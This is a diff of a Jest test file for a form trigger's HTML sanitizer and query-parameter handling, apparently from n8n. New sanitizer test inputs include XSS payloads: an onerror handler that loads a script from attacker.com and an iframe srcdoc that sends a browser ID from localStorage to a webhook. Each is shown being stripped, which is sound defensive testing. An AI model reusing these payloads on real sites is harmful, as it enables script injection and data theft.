@@ -1,3 +1,4 @@
+import type { Request } from 'express';
 import { mock } from 'jest-mock-extended';
 import { DateTime } from 'luxon';
 import type {
@@ -21,7 +22,7 @@ import {
 	validateResponseModeConfiguration,
 	prepareFormFields,
 	addFormResponseDataToReturnItem,
-} from '../utils';
+} from '../utils/utils';
 
 describe('FormTrigger, parseFormDescription', () => {
 	it('should remove HTML tags and truncate to 150 characters', () => {
@@ -62,6 +63,25 @@ describe('FormTrigger, sanitizeHtml', () => {
 			{
 				html: '<input type="text" value="test">',
 				expected: '',
+			},
+			{
+				html: '<video width="640" height="360" controls><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">Your browser does not support the video tag.</video>',
+				expected:
+					'<video width="640" height="360" controls><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"></source>Your browser does not support the video tag.</video>',
+			},
+			{
+				html: '<video controls width="640" height="360" onclick="alert(\'XSS\')" style="border:10px solid red;"><source src="javascript:alert(\'XSS\')" type="video/mp4">Fallback text</video>',
+				expected:
+					'<video controls width="640" height="360"><source type="video/mp4"></source>Fallback text</video>',
+			},
+			{
+				html: "<video><source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
+				expected: '<video><source></source></video>',
+			},
+			{
+				html: "<iframe srcdoc=\"<script>fetch('https://YOURDOMAIN.app.n8n.cloud/webhook/pepe?id='+localStorage.getItem('n8n-browserId'))</script>\"></iframe>",
+				expected:
+					'<iframe referrerpolicy="strict-origin-when-cross-origin" allow="fullscreen; autoplay; encrypted-media"></iframe>',
 			},
 		];
 
@@ -603,6 +623,7 @@ jest.mock('luxon', () => ({
 
 describe('prepareFormReturnItem', () => {
 	const mockContext = mock<IWebhookFunctions>({
+		getRequestObject: jest.fn().mockReturnValue({ method: 'GET', query: {} }),
 		nodeHelpers: mock({
 			copyBinaryFile: jest.fn().mockResolvedValue({}),
 		}),
@@ -735,13 +756,35 @@ describe('prepareFormReturnItem', () => {
 		expect(DateTime.now().setZone).toHaveBeenCalledWith('America/New_York');
 	});
 
-	it('should include workflow static data for form trigger node', async () => {
+	it('should not include workflow static data for form trigger node', async () => {
 		const staticData = { queryParam: 'value' };
 		mockContext.getWorkflowStaticData.mockReturnValue(staticData);
 
 		const result = await prepareFormReturnItem(mockContext, [], 'test');
 
-		expect(result.json.formQueryParameters).toEqual(staticData);
+		expect(result.json.formQueryParameters).toBeUndefined();
+	});
+
+	it('should include query parameters if present and is trigger node', async () => {
+		mockContext.getRequestObject.mockReturnValue({
+			method: 'POST',
+			query: { param: 'value' },
+		} as unknown as Request);
+
+		const result = await prepareFormReturnItem(mockContext, [], 'test');
+
+		expect(result.json.formQueryParameters).toEqual({ param: 'value' });
+	});
+
+	it('should not include query parameters if empty', async () => {
+		mockContext.getRequestObject.mockReturnValue({
+			method: 'POST',
+			query: {},
+		} as unknown as Request);
+
+		const result = await prepareFormReturnItem(mockContext, [], 'test');
+
+		expect(result.json.formQueryParameters).toBeUndefined();
 	});
 
 	it('should return html if field name is set', async () => {
